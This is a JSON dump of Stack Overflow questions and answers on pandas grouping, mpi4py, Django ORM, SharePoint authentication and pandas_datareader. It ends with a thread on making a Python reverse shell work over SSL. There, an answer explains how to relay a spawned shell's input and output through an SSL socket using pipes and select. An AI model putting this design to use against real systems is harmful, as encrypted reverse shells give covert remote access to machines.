"creation_date": 1463007584, "answer_id": 37174646, "question_id": 37174371, "link": "https://stackoverflow.com/questions/37174371/pandas-create-multiple-aggregations/37174646#37174646", "title": "Pandas create multiple aggregations", "body": "<p>You could also:</p>\n\n<pre><code>df = df.set_index('Cat1', append=True).unstack().loc[:, 'Cat2']\ndf = pd.Series({col: tuple(values.dropna()) for col, values in df.items()})\ndf = df.groupby(df.values).apply(lambda x: list(x.index))\n</code></pre>\n\n<p>to get</p>\n\n<pre><code>                   Cat1\n(1.0, 2.0)          [B]\n(1.0, 2.0, 3.0)  [A, C]\n(4.0,)              [D]\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 26041, "user_id": 3339965, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3ac89d084d3bc5dc083bad3ea5518f11?s=128&d=identicon&r=PG&f=1", "display_name": "root", "link": "https://stackoverflow.com/users/3339965/root"}, "is_accepted": false, "score": 3, "last_activity_date": 1463007682, "creation_date": 1463007682, "answer_id": 37174657, "question_id": 37174371, "link": "https://stackoverflow.com/questions/37174371/pandas-create-multiple-aggregations/37174657#37174657", "title": "Pandas create multiple aggregations", "body": "<p>You can use <code>groupby</code> twice to achieve this.</p>\n\n<pre><code>df = df.groupby('Cat1')['Cat2'].apply(lambda x: tuple(set(x))).reset_index()\ndf = df.groupby('Cat2')['Cat1'].apply(lambda x: tuple(set(x))).reset_index()\n</code></pre>\n\n<p>I'm using <code>tuple</code> because pandas needs elements to be hashable in order to do a <code>groupby</code>.  The code above doesn't distinguish between <code>(1, 2, 3)</code> and <code>(1, 1, 2, 3)</code>.  If you want to make this distinction, replace <code>set</code> with <code>sorted</code>.</p>\n\n<p>The resulting output:</p>\n\n<pre><code>        Cat2    Cat1\n0     (1, 2)    (B,)\n1  (1, 2, 3)  (A, C)\n2       (4,)    (D,)\n</code></pre>\n"}], "owner": {"reputation": 491, "user_id": 4947923, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/b4a43177ac739fbc81eab89e1b15186e?s=128&d=identicon&r=PG&f=1", "display_name": "Yona", "link": "https://stackoverflow.com/users/4947923/yona"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 120, "favorite_count": 0, "answer_count": 2, "score": 3, "last_activity_date": 1463010490, "creation_date": 1463006001, "last_edit_date": 1463010490, "question_id": 37174371, "link": "https://stackoverflow.com/questions/37174371/pandas-create-multiple-aggregations", "title": "Pandas create multiple aggregations", "body": "<p>Trying to see how hard or easy this is to do with Pandas. </p>\n\n<p>Let's say one has a two columns with data such as:</p>\n\n<pre><code>Cat1  Cat2\nA        1\nA        2\nA        3\nB        1\nB        2\nC        1\nC        2\nC        3\nD        4\n</code></pre>\n\n<p>As you see <code>A</code> and <code>C</code> have three common elements <code>1, 2, 3</code>. <code>B</code> however has only two elements 1 and 2. <code>D</code> has only one element: 4.</p>\n\n<p>How would one programmatically get to this same result. The idea will be to have each group returned somehow. So one will be <code>[A, C]</code> and <code>[1, 2, 3]</code>, then <code>[B]</code> and <code>[1, 2]</code> and <code>[D]</code> with <code>[4]</code>. </p>\n\n<p>I know a program can be written to do this so I am trying to figure out if there is something on Pandas to do it without having to build stuff from scratch.</p>\n\n<p>Thanks!</p>\n"}, {"tags": ["python", "parallel-processing", "mpi", "mpi4py"], "comments": [{"owner": {"reputation": 262567, "user_id": 748858, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/17gYz.png?s=128&g=1", "display_name": "mgilson", "link": "https://stackoverflow.com/users/748858/mgilson"}, "edited": false, "score": 0, "creation_date": 1463006268, "post_id": 37174356, "comment_id": 61883485, "body": "I <i>think</i> that <i>every</i> process should be specifying the same root (so that they all know where to send the data).  Right now, every process is specifying themselves as the root, so they all think that they&#39;re the reciever and just sit there waiting for someone else to send them data."}, {"owner": {"reputation": 1340, "user_id": 2362377, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/62b8eb91e4d98ef37d2f1eaa56799c74?s=128&d=identicon&r=PG&f=1", "display_name": "SpiderRico", "link": "https://stackoverflow.com/users/2362377/spiderrico"}, "reply_to_user": {"reputation": 262567, "user_id": 748858, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/17gYz.png?s=128&g=1", "display_name": "mgilson", "link": "https://stackoverflow.com/users/748858/mgilson"}, "edited": false, "score": 0, "creation_date": 1463006338, "post_id": 37174356, "comment_id": 61883500, "body": "@mgilson That sounds logical. Do you know how else I can achieve the desired result though ? I don&#39;t want to use AllGather() btw."}, {"owner": {"reputation": 262567, "user_id": 748858, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/17gYz.png?s=128&g=1", "display_name": "mgilson", "link": "https://stackoverflow.com/users/748858/mgilson"}, "edited": false, "score": 0, "creation_date": 1463006422, "post_id": 37174356, "comment_id": 61883532, "body": "I think that depends on what the desired result <i>is</i>.  Normally, the idea is to gather all of the data on the other processes to a specified process.  Do you know which process you want to gather the data on?"}, {"owner": {"reputation": 1340, "user_id": 2362377, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/62b8eb91e4d98ef37d2f1eaa56799c74?s=128&d=identicon&r=PG&f=1", "display_name": "SpiderRico", "link": "https://stackoverflow.com/users/2362377/spiderrico"}, "reply_to_user": {"reputation": 262567, "user_id": 748858, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/17gYz.png?s=128&g=1", "display_name": "mgilson", "link": "https://stackoverflow.com/users/748858/mgilson"}, "edited": false, "score": 0, "creation_date": 1463006467, "post_id": 37174356, "comment_id": 61883548, "body": "I want it to be duplicated on every process."}, {"owner": {"reputation": 262567, "user_id": 748858, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/17gYz.png?s=128&g=1", "display_name": "mgilson", "link": "https://stackoverflow.com/users/748858/mgilson"}, "edited": false, "score": 0, "creation_date": 1463008237, "post_id": 37174356, "comment_id": 61884060, "body": "Ahh ... then in that case, there&#39;s an <a href=\"http://www.mpich.org/static/docs/v3.2/www3/MPI_Allgather.html\" rel=\"nofollow noreferrer\">MPI_Allgather</a> method you could probably use.  I don&#39;t know what the <code>mpi4py</code> wrapper method is called ..."}, {"owner": {"reputation": 262567, "user_id": 748858, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/17gYz.png?s=128&g=1", "display_name": "mgilson", "link": "https://stackoverflow.com/users/748858/mgilson"}, "edited": false, "score": 0, "creation_date": 1463009682, "post_id": 37174356, "comment_id": 61884464, "body": "(but I would guess <code>MPI.Allgather</code> ... ;-)"}], "answers": [{"tags": [], "owner": {"reputation": 20828, "user_id": 620382, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/bf285996e4e7188feac84786a47d9f3a?s=128&d=identicon&r=PG", "display_name": "Zulan", "link": "https://stackoverflow.com/users/620382/zulan"}, "is_accepted": true, "score": 1, "last_activity_date": 1463044503, "creation_date": 1463044503, "answer_id": 37182396, "question_id": 37174356, "link": "https://stackoverflow.com/questions/37174356/why-gather-fails-if-the-root-of-every-process-is-itself/37182396#37182396", "title": "Why Gather() fails if the root of every process is itself?", "body": "<p>All collective operations in MPI must be called by all processes in the respective communicator. Many of the parameters must be the same on all processes. The semantics of the parameters are very well documented in the <a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1256.pdf\" rel=\"nofollow\">MPI standard</a>:</p>\n\n<blockquote>\n  <p>The argumentsroot and comm must have identical values on all\n  processes.</p>\n</blockquote>\n\n<p>But then again, there is also <code>MPI_Allgather</code>, after which the entire data is available on all processes - i.e. there is no root.</p>\n"}], "owner": {"reputation": 1340, "user_id": 2362377, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/62b8eb91e4d98ef37d2f1eaa56799c74?s=128&d=identicon&r=PG&f=1", "display_name": "SpiderRico", "link": "https://stackoverflow.com/users/2362377/spiderrico"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 86, "favorite_count": 0, "accepted_answer_id": 37182396, "answer_count": 1, "score": 1, "last_activity_date": 1463044503, "creation_date": 1463005938, "last_edit_date": 1463006730, "question_id": 37174356, "link": "https://stackoverflow.com/questions/37174356/why-gather-fails-if-the-root-of-every-process-is-itself", "title": "Why Gather() fails if the root of every process is itself?", "body": "<p>Code: </p>\n\n<pre><code>#mpiexec  -n 2 python3  gather.py\nfrom mpi4py import MPI\n\ncomm = MPI.COMM_WORLD\nrank = comm.Get_rank()\n\na = 1\ncomm.barrier()\nb = comm.gather(a, root=rank)\nprint(\"b:\", b, rank )\ncomm.barrier()\n</code></pre>\n\n<p>Output should be:</p>\n\n<blockquote>\n  <p>b:[1, 1], 0</p>\n  \n  <p>b:[1, 1], 1</p>\n</blockquote>\n\n<p>However, program doesn't print anything and doesn't terminate. What's the reason for that and how can I achieve the desired output ? </p>\n"}, {"tags": ["python", "django"], "comments": [{"owner": {"reputation": 47988, "user_id": 267540, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/2v58W.jpg?s=128&g=1", "display_name": "e4c5", "link": "https://stackoverflow.com/users/267540/e4c5"}, "edited": false, "score": 0, "creation_date": 1463007035, "post_id": 37174310, "comment_id": 61883715, "body": "The most important point is that you don&#39;t need to. If you have the query just use it"}, {"owner": {"reputation": 1294, "user_id": 1591222, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/XOZX8.jpg?s=128&g=1", "display_name": "durdenk", "link": "https://stackoverflow.com/users/1591222/durdenk"}, "edited": false, "score": 0, "creation_date": 1463007038, "post_id": 37174310, "comment_id": 61883718, "body": "I dont think, you can. There is foreignkey releationship and django manages this with a column field_id,  I dont think you can overcome this. I saw you join with mac_address."}], "answers": [{"tags": [], "owner": {"reputation": 5742, "user_id": 1904584, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/GlhYH.jpg?s=128&g=1", "display_name": "trinchet", "link": "https://stackoverflow.com/users/1904584/trinchet"}, "is_accepted": false, "score": 0, "last_activity_date": 1463007075, "creation_date": 1463007075, "answer_id": 37174546, "question_id": 37174310, "link": "https://stackoverflow.com/questions/37174310/how-can-i-convert-this-sql-command-to-django-orm-code/37174546#37174546", "title": "How Can I convert this SQL Command to Django ORM code", "body": "<p>You can do this: </p>\n\n<pre><code>StudentDetails.objects.filter(Mac_Address=AttendenceDetails.object.get(LecClass='273', Date=today()).Mac_Address).values_list('First_Name', 'Last_Name', 'LecClass', 'Student_Id', flat=True)\n</code></pre>\n\n<p>Although, a better solution is it to have a foreign key to establish a direct relationship between these two models</p>\n"}], "owner": {"reputation": 341, "user_id": 5616775, "user_type": "registered", "accept_rate": 43, "profile_image": "https://graph.facebook.com/10207829879888917/picture?type=large", "display_name": "Revanth Penugonda", "link": "https://stackoverflow.com/users/5616775/revanth-penugonda"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 34, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1463007075, "creation_date": 1463005659, "question_id": 37174310, "link": "https://stackoverflow.com/questions/37174310/how-can-i-convert-this-sql-command-to-django-orm-code", "title": "How Can I convert this SQL Command to Django ORM code", "body": "<p>I have just started using Django. I wanted to get data with the following sqlquery</p>\n\n<pre><code>select StudentDetails.First_Name,StudentDetails.Last_Name,StudentDetails.LecClass,StudentDetails.Student_Id, AttendenceDetails.Time from StudentDetails,AttendenceDetails where StudentDetails.Mac_Address = AttendenceDetails.Mac_Address and AttendenceDetails.LecClass = \"273\" and AttendenceDetails.Date = curdate()\n</code></pre>\n\n<p>My Models are </p>\n\n<pre><code>class Attendencedetails(models.Model):\nslno = models.AutoField(db_column='SlNo', primary_key=True)  # Field name made lowercase.\nmac_address = models.CharField(db_column='Mac_Address', max_length=45)  # Field name made lowercase.\nlecclass = models.CharField(db_column='LecClass', max_length=45)  # Field name made lowercase.\ndate = models.DateField(db_column='Date')  # Field name made lowercase.\ntime = models.DateTimeField(db_column='Time')  # Field name made lowercase.\nclass Meta:\n    managed = False\n    db_table = 'AttendenceDetails'\n    unique_together = (('mac_address', 'lecclass', 'date'),)\n</code></pre>\n\n<p>Second Table:</p>\n\n<pre><code>class Studentdetails(models.Model):\nslno = models.AutoField(db_column='SlNo', primary_key=True)  # Field name made lowercase.\nfirst_name = models.CharField(db_column='First_Name', max_length=45)  # Field name made lowercase.\nlast_name = models.CharField(db_column='Last_Name', max_length=45)  # Field name made lowercase.\nstudent_id = models.CharField(db_column='Student_Id', max_length=9)  # Field name made lowercase.\nmac_address = models.CharField(db_column='Mac_Address', max_length=45)  # Field name made lowercase.\nlecclass = models.CharField(db_column='LecClass', max_length=5)  # Field name made lowercase.\n\nclass Meta:\n    managed = False\n    db_table = 'StudentDetails'\n    unique_together = (('student_id', 'mac_address', 'lecclass'),)\n</code></pre>\n\n<p>Thanks in Advance</p>\n"}, {"tags": ["python", "excel", "sharepoint"], "answers": [{"tags": [], "owner": {"reputation": 27, "user_id": 7509317, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/67df5622a07325243c91e0aac56df25e?s=128&d=identicon&r=PG&f=1", "display_name": "vivek", "link": "https://stackoverflow.com/users/7509317/vivek"}, "is_accepted": false, "score": 1, "last_activity_date": 1490942802, "creation_date": 1490942802, "answer_id": 43134180, "question_id": 37174273, "link": "https://stackoverflow.com/questions/37174273/authentication-for-downloading-excel-file-from-direct-sharepoint-link-python/43134180#43134180", "title": "Authentication for downloading excel file from direct sharepoint link (python)", "body": "<p>The authentication you are using could be wrong.\nReplace HTTPBasicAuth with NTLM auth or HttpNegotiateAuth.</p>\n\n<pre><code>from requests_ntlm import HttpNtlmAuth, HttpNtlmSspiAuth\nauth = HttpNtlmSspiAuth()\n\nfrom requests_negotiate_sspi import HttpNegotiateAuth\nauth = HttpNegotiateAuth()\n</code></pre>\n"}], "owner": {"reputation": 251, "user_id": 5387269, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/7f336a3b6e8396585d351944438c783b?s=128&d=identicon&r=PG&f=1", "display_name": "CdSdw", "link": "https://stackoverflow.com/users/5387269/cdsdw"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1055, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1490942802, "creation_date": 1463005429, "question_id": 37174273, "link": "https://stackoverflow.com/questions/37174273/authentication-for-downloading-excel-file-from-direct-sharepoint-link-python", "title": "Authentication for downloading excel file from direct sharepoint link (python)", "body": "<p>I'm trying to write some python code to download an excel file, given a direct link. The link is a sharepoint direct download link. I'm getting a 404 unauthorized error when running the code, which I know is because I need to somehow correctly put in the username and password for the sharepoint.</p>\n\n<p>My code snippet looks like this:</p>\n\n<pre><code>username = 'abc'\npassword = '123'\nurl = 'http://example.com/spreadsheet.xls'\nr = requests.get(url, auth=HTTPBasicAuth(username, password))\nprint(r)\n# &lt;Response [401]&gt;\n</code></pre>\n\n<p>I haven't even gotten to the downloading portion if I can't get the authentication right. If the code works, I should expect the value of r to be 200, but I get the value 401, which is an unauthorized error. I'm sure that my username and password are both correct.</p>\n\n<p>Any help would be appreciated. Thanks!</p>\n"}, {"tags": ["python", "pandas", "datareader", "yahoo-finance", "stocks"], "comments": [{"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1463005385, "post_id": 37174237, "comment_id": 61883169, "body": "Are you sure the ellipse is not just in the visual output?"}, {"owner": {"reputation": 289239, "user_id": 704848, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3f9be2c2958e208c8d9b629ac43c9c42?s=128&d=identicon&r=PG", "display_name": "EdChum", "link": "https://stackoverflow.com/users/704848/edchum"}, "edited": false, "score": 0, "creation_date": 1463005439, "post_id": 37174237, "comment_id": 61883197, "body": "That looks like a display issue, if you look at <code>ibm.info()</code> and <code>ibm.tail()</code> you should see that the shape and final rows are present"}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 6322707, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b9c4aa0e92de455d53f82efc956695ee?s=128&d=identicon&r=PG&f=1", "display_name": "jsell", "link": "https://stackoverflow.com/users/6322707/jsell"}, "edited": false, "score": 0, "creation_date": 1463019733, "post_id": 37174271, "comment_id": 61886939, "body": "Thanks a lot for the reply! so is there a way to change what you can see and not get the row of ellipse? or at least to access it?"}, {"owner": {"reputation": 34745, "user_id": 1494637, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/a50559f059e0621b4f543bcda9aad0a6?s=128&d=identicon&r=PG&f=1", "display_name": "Stefan", "link": "https://stackoverflow.com/users/1494637/stefan"}, "reply_to_user": {"reputation": 13, "user_id": 6322707, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b9c4aa0e92de455d53f82efc956695ee?s=128&d=identicon&r=PG&f=1", "display_name": "jsell", "link": "https://stackoverflow.com/users/6322707/jsell"}, "edited": false, "score": 0, "creation_date": 1463019882, "post_id": 37174271, "comment_id": 61886985, "body": "This is really just a display setting issue, the data are avaiable to you. If you want to view on screen, adjust your display max_row setting accordingly (see links). You can always save to csv or excel."}, {"owner": {"reputation": 34745, "user_id": 1494637, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/a50559f059e0621b4f543bcda9aad0a6?s=128&d=identicon&r=PG&f=1", "display_name": "Stefan", "link": "https://stackoverflow.com/users/1494637/stefan"}, "reply_to_user": {"reputation": 13, "user_id": 6322707, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b9c4aa0e92de455d53f82efc956695ee?s=128&d=identicon&r=PG&f=1", "display_name": "jsell", "link": "https://stackoverflow.com/users/6322707/jsell"}, "edited": false, "score": 0, "creation_date": 1463069626, "post_id": 37174271, "comment_id": 61917167, "body": "Did this answer your question or do you need any additional info?"}], "tags": [], "owner": {"reputation": 34745, "user_id": 1494637, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/a50559f059e0621b4f543bcda9aad0a6?s=128&d=identicon&r=PG&f=1", "display_name": "Stefan", "link": "https://stackoverflow.com/users/1494637/stefan"}, "is_accepted": true, "score": 1, "last_activity_date": 1463005764, "last_edit_date": 1463005764, "creation_date": 1463005423, "answer_id": 37174271, "question_id": 37174237, "link": "https://stackoverflow.com/questions/37174237/pandas-datareader-data-not-returning-all-stock-values-from-start-to-end-date/37174271#37174271", "title": "pandas_datareader.data not returning all stock values from start to end date", "body": "<p>This is how <code>pandas</code> displays the result <a href=\"http://pandas.pydata.org/pandas-docs/stable/options.html#overview\" rel=\"nofollow\">(as explained here)</a>. <code>pandas</code> omits rows that exceed the <code>pd.set_option('max_rows', X)</code> setting (<code>default</code> is 50 I believe). You can see the limit using <code>pd.options.display.max_rows</code>. </p>\n\n<p>Try <code>ibm.info()</code> and you should see that there are more rows than displayed.</p>\n\n<p>Your query results in:</p>\n\n<pre><code>&lt;class 'pandas.core.frame.DataFrame'&gt;\nDatetimeIndex: 252 entries, 2015-01-02 to 2015-12-31\nData columns (total 6 columns):\nOpen         252 non-null float64\nHigh         252 non-null float64\nLow          252 non-null float64\nClose        252 non-null float64\nVolume       252 non-null int64\nAdj Close    252 non-null float64\ndtypes: float64(5), int64(1)\nmemory usage: 13.8 KB\nNone\n</code></pre>\n\n<p>But displays as (not <code>rows x columns</code> info at the bottom despite elipsis):</p>\n\n<pre><code>                  Open        High         Low       Close    Volume  \\\nDate                                                                   \n2015-01-02  161.309998  163.309998  161.000000  162.059998   5525500   \n2015-01-05  161.270004  161.270004  159.190002  159.509995   4880400   \n2015-01-06  159.669998  159.960007  155.169998  156.070007   6146700   \n2015-01-07  157.199997  157.199997  154.029999  155.050003   4701800   \n2015-01-08  156.240005  159.039993  155.550003  158.419998   4236800   \n2015-01-09  158.419998  160.339996  157.250000  159.110001   4484800   \n2015-01-12  159.000000  159.250000  155.759995  156.440002   4182800   \n2015-01-13  157.259995  159.970001  155.679993  156.809998   4377500   \n2015-01-14  154.860001  156.490005  153.740005  155.800003   4690300   \n2015-01-15  156.690002  156.970001  154.160004  154.570007   4248400   \n2015-01-16  153.820007  157.630005  153.820007  157.139999   5756000   \n2015-01-20  156.699997  157.330002  154.029999  156.949997   8392800   \n2015-01-21  153.029999  154.500000  151.070007  152.089996  11897100   \n2015-01-22  151.940002  155.720001  151.759995  155.389999   6120100   \n2015-01-23  155.029999  157.600006  154.889999  155.869995   4834800   \n2015-01-26  158.259995  159.460007  155.770004  156.360001   7888100   \n2015-01-27  154.940002  155.089996  152.589996  153.669998   5659600   \n2015-01-28  154.000000  154.529999  151.550003  151.550003   4495900   \n2015-01-29  151.380005  155.580002  149.520004  155.479996   8320800   \n2015-01-30  153.910004  155.240005  153.039993  153.309998   6563600   \n2015-02-02  154.000000  154.660004  151.509995  154.660004   4712200   \n2015-02-03  154.750000  158.600006  154.750000  158.470001   5539400   \n2015-02-04  157.210007  158.710007  156.699997  156.960007   3678500   \n2015-02-05  157.289993  158.589996  157.149994  157.910004   5253600   \n2015-02-06  157.339996  158.080002  156.229996  156.720001   3225000   \n2015-02-09  156.000000  157.500000  155.399994  155.750000   3057700   \n2015-02-10  156.740005  158.559998  155.080002  158.559998   4440600   \n2015-02-11  157.759995  159.089996  157.169998  158.199997   3626700   \n2015-02-12  158.720001  159.500000  158.089996  158.520004   3333100   \n2015-02-13  158.779999  160.800003  158.639999  160.399994   3706900   \n...                ...         ...         ...         ...       ...   \n2015-11-18  134.789993  135.910004  134.259995  135.820007   4149200   \n2015-11-19  136.210007  137.740005  136.009995  136.740005   4753600   \n2015-11-20  137.369995  138.919998  137.250000  138.500000   5176400   \n2015-11-23  138.529999  138.869995  137.119995  138.460007   5137900   \n2015-11-24  137.649994  139.339996  137.309998  138.600006   3407700   \n2015-11-25  138.369995  138.429993  137.380005  138.000000   3238200   \n2015-11-27  138.000000  138.809998  137.210007  138.460007   1415800   \n2015-11-30  138.610001  139.899994  138.520004  139.419998   4545600   \n2015-12-01  139.580002  141.399994  139.580002  141.279999   4195100   \n2015-12-02  140.929993  141.210007  139.500000  139.699997   3725400   \n2015-12-03  140.100006  140.729996  138.190002  138.919998   5909600   \n2015-12-04  138.089996  141.020004  137.990005  140.429993   4571600   \n2015-12-07  140.160004  140.410004  138.809998  139.550003   3279400   \n2015-12-08  138.279999  139.059998  137.529999  138.050003   3905200   \n2015-12-09  137.380005  139.839996  136.229996  136.610001   4615000   \n2015-12-10  137.029999  137.850006  135.720001  136.779999   4222300   \n2015-12-11  135.229996  135.440002  133.910004  134.570007   5333800   \n2015-12-14  135.309998  136.139999  134.020004  135.929993   5143800   \n2015-12-15  137.399994  138.970001  137.279999  137.789993   4207900   \n2015-12-16  139.119995  139.649994  137.789993  139.289993   4345500   \n2015-12-17  139.350006  139.500000  136.309998  136.750000   4089500   \n2015-12-18  136.410004  136.960007  134.270004  134.899994  10026100   \n2015-12-21  135.830002  135.830002  134.020004  135.500000   5617500   \n2015-12-22  135.880005  138.190002  135.649994  137.929993   4263800   \n2015-12-23  138.300003  139.309998  138.110001  138.539993   5164900   \n2015-12-24  138.429993  138.880005  138.110001  138.250000   1495200   \n2015-12-28  137.740005  138.039993  136.539993  137.610001   3143400   \n2015-12-29  138.250000  140.059998  138.199997  139.779999   3943700   \n2015-12-30  139.580002  140.440002  139.220001  139.339996   2989400   \n2015-12-31  139.070007  139.100006  137.570007  137.619995   3462100   \n\n             Adj Close  \nDate                    \n2015-01-02  153.863588  \n2015-01-05  151.442555  \n2015-01-06  148.176550  \n2015-01-07  147.208134  \n2015-01-08  150.407687  \n2015-01-09  151.062791  \n2015-01-12  148.527832  \n2015-01-13  148.879114  \n2015-01-14  147.920202  \n2015-01-15  146.752415  \n2015-01-16  149.192426  \n2015-01-20  149.012033  \n2015-01-21  144.397834  \n2015-01-22  147.530934  \n2015-01-23  147.986654  \n2015-01-26  148.451876  \n2015-01-27  145.897925  \n2015-01-28  143.885151  \n2015-01-29  147.616379  \n2015-01-30  145.556132  \n2015-02-02  146.837859  \n2015-02-03  150.455161  \n2015-02-04  149.021536  \n2015-02-05  149.923486  \n2015-02-06  149.837432  \n2015-02-09  148.910029  \n2015-02-10  151.596622  \n2015-02-11  151.252431  \n2015-02-12  151.558385  \n2015-02-13  153.355812  \n...                ...  \n2015-11-18  133.161622  \n2015-11-19  134.063613  \n2015-11-20  135.789160  \n2015-11-23  135.749949  \n2015-11-24  135.887208  \n2015-11-25  135.298946  \n2015-11-27  135.749949  \n2015-11-30  136.691151  \n2015-12-01  138.514746  \n2015-12-02  136.965669  \n2015-12-03  136.200937  \n2015-12-04  137.681377  \n2015-12-07  136.818611  \n2015-12-08  135.347970  \n2015-12-09  133.936153  \n2015-12-10  134.102824  \n2015-12-11  131.936088  \n2015-12-14  133.269455  \n2015-12-15  135.093050  \n2015-12-16  136.563691  \n2015-12-17  134.073412  \n2015-12-18  132.259616  \n2015-12-21  132.847878  \n2015-12-22  135.230309  \n2015-12-23  135.828370  \n2015-12-24  135.544053  \n2015-12-28  134.916580  \n2015-12-29  137.044105  \n2015-12-30  136.612715  \n2015-12-31  134.926379  \n\n[252 rows x 6 columns]\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 6322707, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b9c4aa0e92de455d53f82efc956695ee?s=128&d=identicon&r=PG&f=1", "display_name": "jsell", "link": "https://stackoverflow.com/users/6322707/jsell"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1368, "favorite_count": 0, "accepted_answer_id": 37174271, "answer_count": 1, "score": 1, "last_activity_date": 1463005764, "creation_date": 1463005199, "last_edit_date": 1463005528, "question_id": 37174237, "link": "https://stackoverflow.com/questions/37174237/pandas-datareader-data-not-returning-all-stock-values-from-start-to-end-date", "title": "pandas_datareader.data not returning all stock values from start to end date", "body": "<p>I am trying to get stock data from yahoo using <code>pandas_datareader.data</code> and i keep getting missing sections of data. here is what i have coded. all i want to do right now is return all the data for the dates between the start and end dates </p>\n\n<pre><code>import pandas as pd \n\nimport pandas_datareader.data as web\n\nfrom datetime import datetime\n\n\n\nibm = web.DataReader('IBM',  'yahoo', datetime(2015,1,1)\n\ndatetime(2016,1,1))\n</code></pre>\n\n<p>and right now this is returning this:</p>\n\n<p><a href=\"http://i.stack.imgur.com/ogITk.png\" rel=\"nofollow\">data</a></p>\n\n<p>I am confused why i am getting the ellipse with all the missing data when i try to create my set. any help would be greatly appreciated!</p>\n"}, {"tags": ["python", "shell", "sockets", "ssl"], "answers": [{"comments": [{"owner": {"reputation": 624, "user_id": 4709695, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/26b4a5cf96926a9c3b6f030d0006d9f0?s=128&d=identicon&r=PG&f=1", "display_name": "Sidahmed", "link": "https://stackoverflow.com/users/4709695/sidahmed"}, "edited": false, "score": 0, "creation_date": 1463042340, "post_id": 37177011, "comment_id": 61896422, "body": "Thanks, I get the error that I am making. Is there a way to get the SSL file descriptor, so I can write in it directly with my reverse shell ??"}, {"owner": {"reputation": 89578, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "reply_to_user": {"reputation": 624, "user_id": 4709695, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/26b4a5cf96926a9c3b6f030d0006d9f0?s=128&d=identicon&r=PG&f=1", "display_name": "Sidahmed", "link": "https://stackoverflow.com/users/4709695/sidahmed"}, "edited": false, "score": 0, "creation_date": 1463045966, "post_id": 37177011, "comment_id": 61899187, "body": "@Sidahmed: again - the kernel file descriptor is the TCP socket only and the SSL is implemented in user space. There is no &quot;SSL file descriptor&quot; usable by a spawned process because the SSL state exists only in the different user space of the original process."}], "tags": [], "owner": {"reputation": 89578, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "is_accepted": false, "score": 1, "last_activity_date": 1463025622, "last_edit_date": 1495535295, "creation_date": 1463025622, "answer_id": 37177011, "question_id": 37174193, "link": "https://stackoverflow.com/questions/37174193/reverse-shell-over-ssl-in-python/37177011#37177011", "title": "Reverse shell over SSL in python", "body": "<p>TCP is implemented in the OS kernel while SSL is implemented in user space. The file descriptor you get with <code>fileno()</code> is the kernel representation only. Thus your code establishes first a TCP connection (kernel space) followed by wrapping the TCP socket into SSL (user space). But after establishing the SSL connection you attempt to write directly on the TCP socket instead of wrapping the data according to the SSL protocol. This will immediately lead to invalid SSL protocol data and to connection close.</p>\n\n<p>Instead you would need to create a child process and exchange the data between the parent and the child, typically via mapping stdin/stdout to pipes or a socketpair. And in the parent you can then forward the data from the child using the SSL socket and also push data to the child after reading them from the SSL socket. </p>\n\n<p>To know when data are available on each of the file descriptors (i.e. SSL socket and communication with child process) you might use select. Note that you have to take special care when using select with SSL sockets too, i.e. simple select is not enough with SSL but you have to <a href=\"https://stackoverflow.com/questions/3187565/select-and-ssl-in-python\">use pending</a>. </p>\n"}, {"tags": [], "owner": {"reputation": 181, "user_id": 4930299, "user_type": "registered", "profile_image": 